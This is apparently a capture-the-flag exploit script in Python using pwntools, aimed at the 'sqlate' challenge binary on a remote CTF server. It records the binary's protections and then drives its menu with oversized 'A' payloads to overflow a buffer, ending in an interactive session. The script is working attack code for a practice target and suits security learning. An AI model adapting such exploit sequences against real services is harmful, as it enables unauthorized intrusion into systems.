#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'sqlate.chal.irisc.tf', 10000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec vuln 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def exploit():
    global io
    io = initialize()

    payload = b'A' * 255

    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', b'bruv')
    io.sendlineafter(b':', b'idk')
    io.sendafter(b':', payload)

    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', b'bruv')

    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', payload[:190])
    io.sendlineafter(b':', b'bruv')

    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', b'bruv')

    io.sendlineafter(b'>', b'7')

    io.interactive()
    
if __name__ == '__main__':
    exploit()
